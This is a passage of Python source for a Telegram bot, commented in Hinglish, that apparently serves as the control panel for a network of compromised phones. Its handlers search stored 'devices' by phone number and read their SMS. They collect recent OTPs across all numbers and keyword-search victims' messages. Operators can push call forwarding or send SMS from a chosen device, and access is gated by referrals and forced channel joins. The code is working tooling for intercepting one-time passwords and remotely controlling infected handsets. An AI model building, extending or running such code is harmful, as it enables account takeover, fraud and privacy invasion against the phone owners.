        if doc.file_size and doc.file_size > 500_000:
            await update.message.reply_text("⚠️ File bahut badi hai (max 500KB).")
            return

        wait_msg = await update.message.reply_text("📂 Panel TXT file read ho rahi hai...")
        try:
            tg_file = await ctx.bot.get_file(doc.file_id)
            import io as _io
            buf = _io.BytesIO()
            await tg_file.download_to_memory(buf)
            content = buf.getvalue().decode("utf-8-sig", errors="strict")
        except UnicodeDecodeError:
            try:
                content = buf.getvalue().decode("utf-8", errors="ignore")
            except Exception:
                content = ""
        except Exception as e:
            try: await wait_msg.edit_text(f"❌ File download error: {e}")
            except: pass
            return

        try: await wait_msg.delete()
        except: pass

        await handle_bulk_panel_import(update, ctx, content, source_label=f"TXT: {fname}")
        return

    # ── EXISTING: .txt file se bulk number search ───────────────────
    if not (fname.lower().endswith(".txt") or "text" in mime.lower()):
        await update.message.reply_text("⚠️ Sirf .txt file bhejein jisme numbers hon (ek per line).")
        return

    if doc.file_size and doc.file_size > 500_000:
        await update.message.reply_text("⚠️ File bahut badi hai (max 500KB).")
        return

    wait_msg = await update.message.reply_text("📂 File padh raha hoon...")
    try:
        tg_file = await ctx.bot.get_file(doc.file_id)
        import io as _io
        buf = _io.BytesIO()
        await tg_file.download_to_memory(buf)
        content = buf.getvalue().decode("utf-8", errors="ignore")
    except Exception as e:
        await wait_msg.edit_text(f"❌ File download error: {e}")
        return

    # Extract numbers from file content
    raw_queries = re.split(r"[\n,;\s]+", content.strip())
    queries = [re.sub(r"\D", "", q) for q in raw_queries if len(re.sub(r"\D", "", q)) >= 8]
    queries = list(dict.fromkeys(queries))

    if not queries:
        await wait_msg.edit_text("❌ File mein koi valid number nahi mila (min 8 digits chahiye).")
        return

    await wait_msg.edit_text(
        f"📂 File mein <b>{len(queries)}</b> numbers mile.\n🔍 Search ho raha hai...",
        parse_mode="HTML"
    )

    devices = await get_all_devices(is_admin)

    # Pre-build index for fast lookup
    device_num_index = {}
    for d in devices:
        for num in d.numbers:
            clean = re.sub(r"\D", "", num)
            if clean not in device_num_index:
                device_num_index[clean] = []
            device_num_index[clean].append(d)

    results_found   = []
    results_missing = []
    for q in queries:
        matched = []
        for stored_num, devs in device_num_index.items():
            if q in stored_num or stored_num in q:
                for d in devs:
                    if d not in matched:
                        matched.append(d)
        if matched: results_found.append((q, matched))
        else:       results_missing.append(q)

    try: await wait_msg.delete()
    except: pass

    found_c = len(results_found)
    miss_c  = len(results_missing)

    summary = (
        f"🎯 <b>File Bulk Search Results</b>\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"📋 File mein numbers : <b>{len(queries)}</b>\n"
        f"✅ Mila              : <b>{found_c}</b>\n"
        f"❌ Nahi Mila         : <b>{miss_c}</b>\n"
        f"━━━━━━━━━━━━━━━━━━"
    )
    rows = []
    for q, devs in results_found[:20]:
        d = devs[0]
        icon = "🟢" if d.status == "online" else "🔴"
        num_label = d.numbers[0] if d.numbers else d.name
        rows.append([premium_button(f"{icon} {q} → [{d.db_tag}] {num_label}", callback_data=f"sel:{d.id}")])
    rows.append([premium_button("❌ Close", callback_data="close_msg")])
    await update.message.reply_text(summary, reply_markup=InlineKeyboardMarkup(rows), parse_mode="HTML")

    # Full result as .txt file
    import io
    file_lines = [
        f"=== FILE BULK SEARCH RESULTS ===",
        f"Source file: {fname}",
        f"Total: {len(queries)} | Mila: {found_c} | Nahi Mila: {miss_c}",
        f"{'='*40}", "",
        "✅ MILA (Found):",
    ]
    for q, devs in results_found:
        d = devs[0]
        status = "ONLINE" if d.status == "online" else "offline"
        num_label = d.numbers[0] if d.numbers else d.name
        file_lines.append(f"  {q}  →  [{d.db_tag}] {num_label}  ({status})")
    file_lines += ["", "❌ NAHI MILA (Not Found):"]
    for q in results_missing:
        file_lines.append(f"  {q}")

    file_bytes = "\n".join(file_lines).encode("utf-8")
    file_obj   = io.BytesIO(file_bytes)
    file_obj.name = "bulk_result.txt"
    await update.message.reply_document(
        document=file_obj,
        filename="bulk_result.txt",
        caption=f"📄 Full result — {found_c} mila, {miss_c} nahi mila",
    )

# ═══════════════════════════════════════════════════════
#  TEXT HANDLER & INPUT PIPELINES
# ═══════════════════════════════════════════════════════

async def _on_text_impl(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    global DATABASES, FORCE_JOIN_CHANNELS, REQUIRED_REFERRALS
    chat_id = update.effective_chat.id
    text = (update.message.text or "").strip()
    is_admin = maybe_promote_admin(update.effective_user) or (chat_id in ADMIN_IDS)

    _log(f"TXT {chat_id} admin={is_admin} pending={pending_action.get(chat_id)} ALL_PENDING={dict(pending_action)} text={text[:45]!r}")

    if all_users.get(chat_id, {}).get("banned") or is_spamming(chat_id): return

    if not is_admin and MAINTENANCE_MODE:
        await update.message.reply_text(
            "🛠 <b>MAINTENANCE MODE</b>\n━━━━━━━━━━━━━━━━━━\n"
            "Bot abhi maintenance par hai. Thodi der baad try karein.",
            parse_mode="HTML"
        )
        return

    if text in ("My Profile", "Help"):
        if text == "My Profile":
            u = all_users.get(chat_id, {})
            await update.message.reply_text(
                f"{premium_emoji()} <b>MY PROFILE</b>\n━━━━━━━━━━━━━━━━━━\n"
                f"🆔 ID       : <code>{chat_id}</code>\n"
                f"👤 Name     : <b>{html_escape(u.get('name', 'Unknown'))}</b>\n"
                f"🔗 Username : @{html_escape(u.get('username') or 'none')}\n"
                f"📅 Joined   : <b>{u.get('joined_at', '-')}</b>\n"
                f"✅ Access   : <b>{'Yes' if has_access(chat_id) else 'No'}</b>\n"
                f"🎁 Referrals: <b>{referral_count(chat_id)}/{REQUIRED_REFERRALS}</b>",
                parse_mode="HTML",
                reply_markup=user_extra_keyboard()
            )
        else:
            await update.message.reply_text(
                f"{premium_emoji()} <b>HELP</b>\n━━━━━━━━━━━━━━━━━━\n"
                "📡 All Panels — sabhi panels\n"
                "🔍 Search Number — number search\n"
                "🔑 Keyword Search — keyword search\n"
                "🕒 Recent OTPs — latest OTPs\n"
                "📊 Panel Status — health check\n"
                "━━━━━━━━━━━━━━━━━━\n"
                "Commands: /start /status",
                parse_mode="HTML",
                reply_markup=user_extra_keyboard()
            )
        return

    if not is_admin:
        ready, reason = await gate_state(ctx.bot, chat_id)
        if not ready:
            await send_gate_message(update, ctx, reason)
            return

    if chat_id in pending_action:
        act_data = pending_action.pop(chat_id)
        action = act_data["action"]

        if action == "broadcast_buttons" and is_admin:
            src_msg = act_data.get("src_msg")
            raw = text.strip()
            if raw.lower() in ("skip", "-", "no", "none"):
                markup = None
            else:
                try:
                    markup = _parse_broadcast_buttons(raw)
                except Exception as exc:
                    await update.message.reply_text(
                        f"\u274c Button format galat: <code>{html_escape(str(exc))}</code>\n"
                        "Example: <code>Open | https://example.com</code>",
                        parse_mode="HTML",
                    )
                    pending_action[chat_id] = act_data
                    return
                if markup is None:
                    await update.message.reply_text(
                        "\u274c Koi valid button nahi mila.\n"
                        "Format: <code>Label | https://url</code>\n"
                        "Ya <code>skip</code> bhejein.",
                        parse_mode="HTML",
                    )
                    pending_action[chat_id] = act_data
                    return
            if not src_msg:
                await update.message.reply_text("\u274c Source message lost. Broadcast dobara shuru karein.")
                return
            await _run_broadcast(ctx, chat_id, int(src_msg), markup)
            return

        try:
            if await extra_text_actions(update, ctx, action, act_data, text, chat_id, is_admin):
                return
        except Exception as e:
            _log(f"extra_text_actions error [{action}]: {type(e).__name__}: {e}")

        if action == "add_force_join_channel" and is_admin:
            value = text.strip()
            if not value:
                await update.message.reply_text("❌ Channel details empty nahi ho sakti.")
                pending_action[chat_id] = act_data
                return

            # ── MULTI-ADD SUPPORT ─────────────────────────────────────
            # Ek hi message me kitne bhi channels — har line pe ek channel:
            #   @channel1
            #   @channel2
            #   https://t.me/channel3
            #   -1001234567890 | https://t.me/+xxxx
            raw_lines = [ln.strip() for ln in re.split(r"[\n,;]+", value) if ln.strip()]

            def _parse_one(raw: str):
                """Returns (channel, url, error_message)."""
                if "|" in raw:
                    ch, u = [x.strip() for x in raw.split("|", 1)]
                else:
                    ch, u = raw, ""

                m_url = re.fullmatch(
                    r"(?:https?://)?(?:www\.)?(?:t|telegram)\.me/([A-Za-z][A-Za-z0-9_]{3,})/?",
                    ch,
                )
                if m_url:
                    ch = "@" + m_url.group(1)

                m_invite = re.fullmatch(
                    r"(?:https?://)?(?:www\.)?(?:t|telegram)\.me/(\+[A-Za-z0-9_-]+|joinchat/[A-Za-z0-9_-]+)/?",
                    ch,
                )
                if m_invite and not u:
                    return None, None, (
                        "Ye sirf invite link hai — iske saath numeric ID chahiye.\n"
                        "Format: <code>-1001234567890 | https://t.me/+xxxx</code>"
                    )

                if not (ch.startswith("@") or ch.startswith("-100")):
                    if re.fullmatch(r"[A-Za-z][A-Za-z0-9_]{3,}", ch):
                        ch = "@" + ch
                    else:
                        return None, None, (
                            "Invalid format. Public: <code>@username</code> / "
                            "<code>https://t.me/username</code> · Private: "
                            "<code>-1001234567890 | https://t.me/+xxxx</code>"
                        )

                if u and not re.fullmatch(r"(?:https?://)?(?:www\.)?(?:t|telegram)\.me/.+", u):
                    return None, None, "URL invalid hai. Example: <code>https://t.me/+xxxx</code>"

                if ch.startswith("-100") and not u:
                    return None, None, (
                        "Private channel ke liye invite URL zaroori hai.\n"
                        "Example: <code>-1001234567890 | https://t.me/+xxxx</code>"
                    )
                return ch, u, None

            existing = {
                str(item.get("channel", "")).strip()
                for item in FORCE_JOIN_CHANNELS
                if isinstance(item, dict)
            }

            added, skipped, failed = [], [], []
            for raw in raw_lines:
                ch, u, err = _parse_one(raw)
                if err:
                    failed.append((raw, err))
                    continue
                if ch in existing:
                    skipped.append(ch)
                    continue
                # Public channel ho to bot usse resolve kar paata hai ya nahi —
                # verify check ke liye bot ka channel me hona zaroori hai.
                warn = ""
                if ch.startswith("@"):
                    try:
                        await ctx.bot.get_chat(ch)
                    except Exception:
                        warn = " ⚠️ <i>Bot is channel tak nahi pahunch paaya — bot ko channel me admin/member banayein, warna Verify check fail hoga.</i>"
                FORCE_JOIN_CHANNELS.append({"channel": ch, "url": u})
                existing.add(ch)
                added.append((ch, u, warn))

            if added:
                save_data()

            lines = [f"{premium_emoji()} <b>FORCE JOIN — ADD RESULT</b>", "━━━━━━━━━━━━━━━━━━"]
            for ch, u, warn in added:
                lines.append(f"✅ <code>{html_escape(ch)}</code>")
                lines.append(f"   🔗 <code>{html_escape(u or get_force_join_url({'channel': ch}))}</code>{warn}")
            for ch in skipped:
                lines.append(f"🔁 <code>{html_escape(ch)}</code> — already added")
            for raw, err in failed:
                lines.append(f"❌ <code>{html_escape(raw[:40])}</code>\n   {err}")
            lines.append("━━━━━━━━━━━━━━━━━━")
            lines.append(f"📢 Total channels: <b>{len(FORCE_JOIN_CHANNELS)}</b>")

            await update.message.reply_text(
                "\n".join(lines),
                parse_mode="HTML",
                reply_markup=admin_force_join_keyboard()
            )
            return

        if action == "set_required_referrals" and is_admin:
            try:
                value = max(0, int(text.strip()))
            except ValueError:
                await update.message.reply_text("❌ Sirf number bhejein. Example: 2")
                return
            REQUIRED_REFERRALS = value
            save_data()
            await update.message.reply_text(
                f"✅ Required referrals set to <b>{REQUIRED_REFERRALS}</b>.", parse_mode="HTML",
                reply_markup=admin_referral_keyboard()
            )
            return

        if action == "search_num_pipe":
            if not has_access(chat_id):
                await update.message.reply_text(NO_ACCESS_TEXT, parse_mode="HTML"); return
            devices = await get_all_devices(is_admin)
            clean_q = re.sub(r"\D", "", text)
            found = [
                d for d in devices
                if any(clean_q in re.sub(r"\D", "", num) for num in d.numbers)
                and (is_admin or d.db_tag not in ADMIN_ONLY_TAGS)
            ]
            if found:
                rows = [[premium_button(
                    f"📱 [{fd.db_tag}] {fd.numbers[0] if fd.numbers else fd.name}",
                    callback_data=f"sel:{fd.id}"
                )] for fd in found[:15]]
                await update.message.reply_text("🎯 Matched Targets:", reply_markup=InlineKeyboardMarkup(rows))
            else:
                await update.message.reply_text("❌ Yeh number kisi bhi database mein nahi mila.")
            return

        if action == "bulk_search_pipe":
            if not has_access(chat_id):
                await update.message.reply_text(NO_ACCESS_TEXT, parse_mode="HTML"); return
            raw_queries = re.split(r"[\n,;\s]+", text.strip())
            queries = [re.sub(r"\D", "", q) for q in raw_queries if len(re.sub(r"\D", "", q)) >= 8]
            queries = list(dict.fromkeys(queries))  # remove duplicates, keep order

            if not queries:
                await update.message.reply_text("❌ Koi valid number nahi mila (min 8 digits chahiye).")
                return

            devices = await get_all_devices(is_admin)
            # Pre-build device number index for fast lookup
            device_num_index = {}
            for d in devices:
                for num in d.numbers:
                    clean = re.sub(r"\D", "", num)
                    if clean not in device_num_index:
                        device_num_index[clean] = []
                    device_num_index[clean].append(d)

            wait_msg = await update.message.reply_text(
                f"🔍 <b>{len(queries)}</b> numbers search ho rahe hain...\n⏳ Wait karein...",
                parse_mode="HTML"
            )

            results_found   = []
            results_missing = []

            for q in queries:
                matched = []
                for stored_num, devs in device_num_index.items():
                    if q in stored_num or stored_num in q:
                        for d in devs:
                            if d not in matched:
                                matched.append(d)
                if matched:
                    results_found.append((q, matched))
                else:
                    results_missing.append(q)

            try: await wait_msg.delete()
            except: pass

            total   = len(queries)
            found_c = len(results_found)
            miss_c  = len(results_missing)

            # ── Summary message ──────────────────────────────────────
            summary = (
                f"🎯 <b>Bulk Search Results</b>\n"
                f"━━━━━━━━━━━━━━━━━━\n"
                f"📋 Total searched : <b>{total}</b>\n"
                f"✅ Mila           : <b>{found_c}</b>\n"
                f"❌ Nahi Mila      : <b>{miss_c}</b>\n"
                f"━━━━━━━━━━━━━━━━━━"
            )

            # Show first 20 found as inline buttons
            rows = []
            for q, devs in results_found[:20]:
                d = devs[0]
                icon = "🟢" if d.status == "online" else "🔴"
                num_label = d.numbers[0] if d.numbers else d.name
                rows.append([premium_button(
                    f"{icon} {q} → [{d.db_tag}] {num_label}",
                    callback_data=f"sel:{d.id}"
                )])
            rows.append([premium_button("❌ Close", callback_data="close_msg")])
            await update.message.reply_text(summary, reply_markup=InlineKeyboardMarkup(rows), parse_mode="HTML")

            # ── Send full results as .txt file ────────────────────────
            import io
            file_lines = [
                f"=== BULK SEARCH RESULTS ===",
                f"Total: {total} | Mila: {found_c} | Nahi Mila: {miss_c}",
                f"{'='*40}",
                "",
                "✅ MILA (Found):",
            ]
            for q, devs in results_found:
                d = devs[0]
                status = "ONLINE" if d.status == "online" else "offline"
                num_label = d.numbers[0] if d.numbers else d.name
                file_lines.append(f"  {q}  →  [{d.db_tag}] {num_label}  ({status})")

            file_lines += ["", "❌ NAHI MILA (Not Found):"]
            for q in results_missing:
                file_lines.append(f"  {q}")

            file_bytes = "\n".join(file_lines).encode("utf-8")
            file_obj   = io.BytesIO(file_bytes)
            file_obj.name = "bulk_search_result.txt"
            await update.message.reply_document(
                document=file_obj,
                filename="bulk_search_result.txt",
                caption=f"📄 Full result — {found_c} mila, {miss_c} nahi mila",
            )
            return

        if action == "keyword_search_pipe":
            if not has_access(chat_id):
                await update.message.reply_text(NO_ACCESS_TEXT, parse_mode="HTML"); return
            keyword = text.strip().lower()
            if not keyword:
                await update.message.reply_text("❌ Keyword empty hai. Dobara bhejein.")
                return

            esc_kw   = html_escape(keyword)
            wait_msg = await update.message.reply_text(
                f"🔎 Keyword <code>{esc_kw}</code> ka sample dhundh raha hoon...\n⏳ Ek second...",
                parse_mode="HTML"
            )

            # ── Step 1: Sample preview — fetch SMS from first 20 devices only ──
            devices = await get_all_devices(is_admin)
            devices_with_nums = [d for d in devices if d.numbers]
            preview_devices   = devices_with_nums[:20]

            kw_sem = asyncio.Semaphore(10)
            async def fetch_sms_safe(d):
                async with kw_sem:
                    return await get_device_sms(d, limit=SMS_LIMIT)

            preview_results = await asyncio.gather(
                *(fetch_sms_safe(d) for d in preview_devices), return_exceptions=True
            )

            # Find first SMS that CONTAINS the keyword (sample to show user)
            sample_sms  = None
            sample_dev  = None
            sample_body = ""
            for d, smss in zip(preview_devices, preview_results):
                if isinstance(smss, Exception) or not smss: continue
                for sms in smss:
                    body = (sms.get("body") or sms.get("message") or sms.get("text") or "")
                    if keyword in body.lower():
                        sample_sms  = sms
                        sample_dev  = d
                        sample_body = body
                        break
                if sample_sms: break

            try: await wait_msg.delete()
            except: pass

            if not sample_sms:
                # No matching SMS found in first 20 devices → still let user confirm to run full search
                preview_text = (
                    f"<b>Keyword Preview: <code>{esc_kw}</code></b>\n"
                    f"━━━━━━━━━━━━━━━━━━\n"
                    f"⚠️ Pehle 20 devices mein yeh keyword kisi SMS mein nahi mila.\n\n"
                    f"Phir bhi <b>poora search</b> chalana chahte hain?\n"
                    f"━━━━━━━━━━━━━━━━━━"
                )
            else:
                num_lbl    = sample_dev.numbers[0] if sample_dev.numbers else sample_dev.name
                sender     = sample_sms.get("sender", "Unknown")
                dt         = sms_date(sample_sms)
                # Highlight keyword in body
                highlighted = sample_body.replace(keyword, f"【{keyword}】")[:300]
                preview_text = (
                    f"<b>Keyword Preview: <code>{esc_kw}</code></b>\n"
                    f"━━━━━━━━━━━━━━━━━━\n"
                    f"Number : {html_escape(num_lbl)}\n"
                    f"From   : {html_escape(sender)}\n"
                    f"Date   : {dt}\n"
                    f"━━━━━━━━━━━━━━━━━━\n"
                    f"<b>Message:</b>\n{html_escape(highlighted)}{'...' if len(sample_body) > 300 else ''}\n"
                    f"━━━━━━━━━━━━━━━━━━\n"
                    f"✅ Kya yeh sahi match hai? Confirm karo tab poora search chalega."
                )

            # Store keyword for confirm step
            pending_kw_confirm[chat_id] = keyword

            confirm_kb = InlineKeyboardMarkup([
                [
                    premium_button("✅ Haan, Poora Search Karo", callback_data=f"kw_confirm:{chat_id}"),
                    premium_button("❌ Cancel", callback_data=f"kw_cancel:{chat_id}"),
                ]
            ])
            await update.message.reply_text(preview_text, reply_markup=confirm_kb, parse_mode="HTML")
            return

        if action == "execute_cf":
            dev_id = act_data["dev_id"]
            devices = await get_all_devices(is_admin)
            device = next((d for d in devices if d.id == dev_id), None)
            if not device: return
            ok = await write_call_forward(device, text)
            await update.message.reply_text("✅ Call forward pushed!" if ok else "❌ Command failed.")
            return

        if action == "execute_ss":
            dev_id = act_data["dev_id"]
            devices = await get_all_devices(is_admin)
            device = next((d for d in devices if d.id == dev_id), None)
            if not device: return
            try:
                to_n, body_m = text.split(":", 1)
                ok = await write_send_sms(device, to_n.strip(), body_m.strip())
                await update.message.reply_text("✅ SMS sent!" if ok else "❌ Failed.")
            except:
                await update.message.reply_text("❌ Invalid format. Use: TARGET_NUMBER:MESSAGE")
            return

        if action == "add_bulk_db" and is_admin:
            await handle_bulk_panel_import(update, ctx, text, source_label="message")
            return

        if action == "grant_access_pipe" and is_admin:
            target_id = await _resolve_user_arg(ctx, text)
            if target_id is None:
                await update.message.reply_text(
                    "❌ User nahi mila. Numeric User ID ya @username bhejein.\n"
                    "Dobara try karein (cancel: /cancel)"
                )
                pending_action[chat_id] = act_data
                return
            grant_access(target_id)
            udata = all_users.get(target_id, {})
            name = udata.get("name", "Unknown")
            await update.message.reply_text(f"✅ Access granted to {name} ({target_id})")
            try:
                await ctx.bot.send_message(
                    target_id,
                    "✅ <b>Access Granted!</b>\n\nAapko bot use karne ki ijazat mil gayi.\n/start karein.",
                    parse_mode="HTML"
                )
            except: pass
            return

        if action == "revoke_access_pipe" and is_admin:
            target_id = await _resolve_user_arg(ctx, text)
            if target_id is None:
                await update.message.reply_text(
                    "❌ User nahi mila. Numeric User ID ya @username bhejein.\n"
                    "Dobara try karein (cancel: /cancel)"
                )
                pending_action[chat_id] = act_data
                return
            revoke_access(target_id)
            await update.message.reply_text(f"❌ Access revoked for user {target_id}")
            return

        if action == "broadcast_msg" and is_admin:
            # Handled by on_broadcast_capture (group -1) so that premium emoji,
            # inline buttons and media are copied exactly.
            pending_action[chat_id] = {"action": "broadcast_msg"}
            await update.message.reply_text(
                "\u26a0\ufe0f Broadcast capture handler ne ye message nahi pakda. Dobara bhejein."
            )
            return

        # ── CATCH-ALL for input pipelines ───────────────────────────────────
        # Agar action ka koi handler nahi mila to pehle bot chup ho jata tha.
        # Ab saaf jawab + panel wapas.
        if is_admin:
            await update.message.reply_text(
                f"{premium_emoji()} <b>Ye input samajh nahi aaya.</b>\n"
                f"Action: <code>{html_escape(str(action))}</code>\n\n"
                f"Panel dobara kholne ke liye /start bhejein.",
                parse_mode="HTML",
                reply_markup=admin_keyboard(),
            )
        else:
            await update.message.reply_text(
                "❌ Ye input process nahi ho saka. /start bhejein.",
            )
        return

    if text not in ("⌬ Admin Panel", "◌ Bot Status") and not is_admin:
        if not has_access(chat_id):
            await update.message.reply_text(NO_ACCESS_TEXT, parse_mode="HTML")
            return

    if text in ("✦ Devices List", "Devices List"):
        devices = await get_all_devices(is_admin)
        pg = user_page.get(chat_id, 0)
        await update.message.reply_text(
            device_list_header(devices, pg),
            reply_markup=device_list_keyboard(devices, pg),
            parse_mode="HTML"
        )
        return

    if text in ("▣ All Panels", "All Panels"):
        visible_tags = [t for t in DATABASES if is_admin or t not in ADMIN_ONLY_TAGS]
        total_panels = len(visible_tags)
        total_devs = sum(len(GLOBAL_DEVICE_CACHE.get(t, [])) for t in visible_tags)
        grand_online = sum(
            sum(1 for d in GLOBAL_DEVICE_CACHE.get(t, []) if d.status == "online")
            for t in visible_tags
        )
        header = (f"{premium_emoji()} <b>ALL PANELS</b>\n"
                  f"━━━━━━━━━━━━━━━━━━\n"
                  f"📡 Panels: {total_panels}  |  📱 Devices: {total_devs}\n"
                  f"🟢 Online: {grand_online}  🔴 Offline: {total_devs - grand_online}\n"
                  f"━━━━━━━━━━━━━━━━━━\n"
                  f"Panel pe click karo → us panel ke numbers dikhenge:")
        await update.message.reply_text(header, reply_markup=panels_list_keyboard(is_admin=is_admin), parse_mode="HTML")
        return

    if text in ("⌕ Search Number", "Search Number"):
        pending_action[chat_id] = {"action": "search_num_pipe"}
        await update.message.reply_text("🔍 Search karne ke liye number ya text bhejien:")
        return

    if text in ("⌁ Keyword Search", "Keyword Search"):
        pending_action[chat_id] = {"action": "keyword_search_pipe"}
        await update.message.reply_text(
            "🔎 <b>Keyword Search</b>\n"
            "━━━━━━━━━━━━━━━━━━\n"
            "Woh keyword/text bhejein jo check karna hai.\n\n"
            "Bot saare numbers ke latest SMS check karega.\n"
            "Jis number ke SMS mein keyword <b>NAHI</b> hoga woh screen pe dikhega.\n"
            "Jis number ka koi SMS hi nahi — use skip kar dega.\n"
            "━━━━━━━━━━━━━━━━━━",
            parse_mode="HTML"
        )
        return

    if text in ("🔍 Bulk Search", "Bulk Search"):
        if not is_admin:
            await update.message.reply_text("🚫 Ye feature admin-only hai.", parse_mode="HTML")
            return
        header = (
            "🔍 <b>BULK SEARCH — Panel Selector</b>\n"
            "━━━━━━━━━━━━━━━━━━\n"
            "Panel select karo — sirf wahi numbers milenge jo:\n"
            "🟢 Online hain\n"
            "📅 Aaj / kal / parson OTP aaya ho\n"
            "━━━━━━━━━━━━━━━━━━"
        )
        await update.message.reply_text(header, reply_markup=bulksearch_panels_keyboard(), parse_mode="HTML")
        return

    if text in ("№ Number Search", "Number Search"):
        pending_action[chat_id] = {"action": "bulk_search_pipe"}
        await update.message.reply_text(
            "📋 <b>Bulk Number Search</b>\n"
            "━━━━━━━━━━━━━━━━━━\n"
            "Ek ya zyada numbers bhejein (enter, comma, ya space se alag):\n\n"
            "<i>Example:</i>\n"
            "<code>9876543210\n9123456789\n8800001234</code>\n"
            "━━━━━━━━━━━━━━━━━━\n"
            "Bot sabhi panels mein search karega.",
            parse_mode="HTML"
        )
        return

    if text in ("◉ Panel Status", "Panel Status"):
        lines = ["📊 <b>Panel Status</b>", "━━━━━━━━━━━━━━━━━━"]
        grand_total = grand_online = 0
        for tag in sorted(DATABASES.keys()):
            if not is_admin and tag in ADMIN_ONLY_TAGS: continue
            cached = GLOBAL_DEVICE_CACHE.get(tag, [])
            total  = len(cached)
            online = sum(1 for d in cached if d.status == "online")
            grand_total  += total
            grand_online += online
            bar = "🟢" if online > 0 else ("🔴" if total > 0 else "⚫")
            num_count = sum(len(d.numbers) for d in cached if d.numbers)
            lines.append(f"{bar} <b>{tag}</b> — Total: <code>{total}</code> | Online: <code>{online}</code> | Numbers: <code>{num_count}</code>")
        lines.append("━━━━━━━━━━━━━━━━━━")
        lines.append(f"📱 <b>Grand Total:</b> <code>{grand_total}</code> devices")
        lines.append(f"🟢 <b>Online:</b> <code>{grand_online}</code>  🔴 <b>Offline:</b> <code>{grand_total - grand_online}</code>")
        await update.message.reply_text("\n".join(lines), parse_mode="HTML")
        return

    if text in ("◇ Recent OTPs", "Recent OTPs"):
        devices = await get_all_devices(is_admin)
        out_msg = "📋 Recent OTPs (Latest per Number):\n━━━━━━━━━━━━━━━━━━\n"

        def sms_ts(sm: dict) -> float:
            try:
                ts = float(sm.get("timestamp", 0))
                return ts / 1000 if ts > 1e11 else ts
            except: return 0.0

        devices = [d for d in devices if d.numbers]
        best: dict[str, tuple] = {}
        sms_tasks = await asyncio.gather(*(get_device_sms(d, limit=10) for d in devices))
        for d, smss in zip(devices, sms_tasks):
            num_label = d.numbers[0] if d.numbers else d.id[:10]
            for sm in smss:
                body = sm.get("body") or sm.get("message") or sm.get("text") or ""
                found = extract_otp(body)
                if not found: continue
                ts = sms_ts(sm)
                existing = best.get(num_label)
                if not existing or ts > existing[2]:
                    best[num_label] = (found, sm, ts)

        if not best: out_msg += "📭 Koi fresh OTP nahi mila."
        else:
            sorted_best = sorted(best.items(), key=lambda x: x[1][2], reverse=True)
            for num_label, (otp, sm, _) in sorted_best[:25]:
                out_msg += f"🔑 <code>{escape(str(otp))}</code> | {escape(str(num_label))} | {escape(str(sms_date(sm)))}\n"
        await update.message.reply_text(out_msg, parse_mode="HTML")
        return


    if text in ("◌ Bot Status") and is_admin:
        status_text = (f"◌ Bot Status\n━━━━━━━━━━━━━━━━━━\n"
                       f"🛰 Poll: <code>{POLL_INTERVAL}s</code>\n📦 SMS Limit: <code>{SMS_LIMIT}</code>\n"
                       f"⚡️ DBs: <code>{len(DATABASES)}</code>\n"
                       f"✅ Allowed Users: <code>{len(allowed_users)}</code>\n"
                       f"━━━━━━━━━━━━━━━━━━\n")
        total_nums = 0
        for tag in sorted(DATABASES.keys()):
            cached = GLOBAL_DEVICE_CACHE.get(tag, [])
            cnt = sum(len(d.numbers) for d in cached if d.numbers)
            total_nums += cnt
            status_text += f"{'🟢' if cnt > 0 else '🔴'} <b>{escape(str(tag))}:</b> <code>{cnt}</code> numbers\n"
        status_text += f"\n🎯 <b>Total:</b> <code>{total_nums}</code> numbers"
        await update.message.reply_text(status_text, parse_mode="HTML")
        return

    if text in ("⌬ Admin Panel", "Admin Panel") and is_admin:
        await update.message.reply_text(admin_panel_text(), reply_markup=admin_keyboard(), parse_mode="HTML")
        return

    # ── FINAL FALLBACK — bot kabhi chup nahi rahega ─────────────────────────
    # Agar pending_action kho gaya (bot restart / /start / pehla attempt fail)
    # ya text kisi bhi option se match nahi hua, to yahan hamesha jawab jata hai.
    # SAFETY NET: admin ka text channel/ID jaisa dikhe to one-click quick action
    # de do — pending ke bina bhi kaam ho jayega.
    try:
        if is_admin:
            quick_rows = []
            m_ch = re.fullmatch(
                r"(?:https?://)?(?:www\.)?(?:t|telegram)\.me/([A-Za-z][A-Za-z0-9_]{3,})/?",
                text.strip(),
            ) or re.fullmatch(r"@?([A-Za-z][A-Za-z0-9_]{3,})", text.strip())
            if m_ch:
                ch = "@" + m_ch.group(1)
                if ch in {str(c.get("channel", "")).strip() for c in FORCE_JOIN_CHANNELS if isinstance(c, dict)}:
                    await update.message.reply_text(
                        f"ℹ️ <b>{html_escape(ch)} already Force Join me added hai!</b>\n"
                        f"━━━━━━━━━━━━━━━━━━\n"
                        f"Total channels: <b>{len(FORCE_JOIN_CHANNELS)}</b>\n"
                        f"Force Join: <b>{'ON 🟢' if FORCE_JOIN_ENABLED else 'OFF 🔴'}</b>",
                        parse_mode="HTML",
                        reply_markup=admin_force_join_keyboard(),
                    )
                    return
                quick_rows.append([premium_button(
                    f"➕ {ch} ko Force Join me ADD karo",
                    callback_data=f"fjq:{ch}", style="success")])
            elif re.fullmatch(r"-100\d{6,}", text.strip()):
                quick_rows.append([premium_button(
                    f"➕ {text.strip()} ko Force Join me ADD karo",
                    callback_data=f"fjq:{text.strip()}", style="success")])
            elif re.fullmatch(r"\d{5,15}", text.strip()):
                quick_rows.append([premium_button(
                    f"✅ {text.strip()} ko ACCESS do",
                    callback_data=f"gaq:{text.strip()}", style="success")])
            if quick_rows:
                quick_rows.append([premium_button("❌ Ignore", callback_data="close_msg", style="danger")])
                await update.message.reply_text(
                    f"{premium_emoji()} <b>Pending action expire ho gaya tha</b> — lekin maine samajh liya. 👇\n"
                    "━━━━━━━━━━━━━━━━━━\n"
                    "Ek click me seedha kaam kar dein?",
                    parse_mode="HTML",
                    reply_markup=InlineKeyboardMarkup(quick_rows),
                )
                return
            await update.message.reply_text(
                f"{premium_emoji()} <b>Ye message kisi option se match nahi hua.</b>\n"
                "━━━━━━━━━━━━━━━━━━\n"
                "Agar aap koi detail bhej rahe the (channel username / user ID / URL), "
                "to pehle us option ka <b>button dobara dabayein</b>, phir detail bhejein.\n\n"
                "Panel kholne ke liye /start",
                parse_mode="HTML",
                reply_markup=admin_keyboard(),
            )
        else:
            await update.message.reply_text(
                "❓ Ye message samajh nahi aaya.\nPanel ke liye /start bhejein."
            )
    except Exception as _fe:
        _log(f"final fallback error: {type(_fe).__name__}: {_fe}")


async def on_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    """Crash-proof wrapper: koi bhi exception ho to user ko batayein aur
    pending action wapas set karein taake dobara try kar sakein."""
    chat_id = update.effective_chat.id
    snapshot = dict(pending_action.get(chat_id) or {})
    try:
